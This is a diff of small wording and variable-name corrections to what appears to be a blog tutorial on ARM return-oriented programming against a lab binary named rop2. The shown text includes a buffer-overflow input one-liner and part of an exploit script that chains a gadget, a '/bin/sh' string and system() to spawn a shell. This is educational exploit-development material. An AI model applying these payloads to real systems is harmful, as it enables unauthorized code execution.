@@ -164,7 +164,7 @@ control program execution flow. Let’s try jumping to the <code>winner</code> f
 
 <p>Disassemble <code>winner</code> again using <code>disas winner</code> and note down the offset
 of the second instruction — <code>add r11, sp, #4</code>. 
-For this, we’ll use Python to print out input string replacing <code>FFFF</code> with
+For this, we’ll use Python to print our input string replacing <code>FFFF</code> with
 the address of <code>winner</code>. Note the endianness.</p>
 
 <div class="codehilite"><pre><span></span><code>$ python -c <span class="s1">&#39;print(&quot;AAAABBBBCCCCDDDDEEEE\x28\x05\x01\x00&quot;)&#39;</span> <span class="p">|</span> ./rop2
@@ -226,18 +226,18 @@ found from the disassmblies from earlier. Here’s the final exploit code:</p>
 <span class="n">gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="mh">0x00010550</span><span class="p">)</span>
 <span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="mh">0x00010538</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">string</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">binsh</span> <span class="o">+</span> <span class="n">system_pc</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">string</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">binsh</span> <span class="o">+</span> <span class="n">system</span><span class="p">)</span>
 </code></pre></div>
 
 <p>Honestly, not too far off from our pseudo-code :)</p>
 
-<p>Let's see it in action:</p>
+<p>Let’s see it in action:</p>
 
 <p><img src="/static/img/the_shell.png" alt="the shell!" /></p>
 
 <p>Notice that it doesn’t work the first time, and this is because <code>/bin/sh</code> terminates
 when the pipe closes, since there’s no input coming in from STDIN.
-To get around this, we use <code>cat(1)</code> which allows us to relay input via <code>cat</code>
+To get around this, we use <code>cat(1)</code> which allows us to relay input through it
 to the shell. Nifty trick.</p>
 
 <h3>Conclusion</h3>
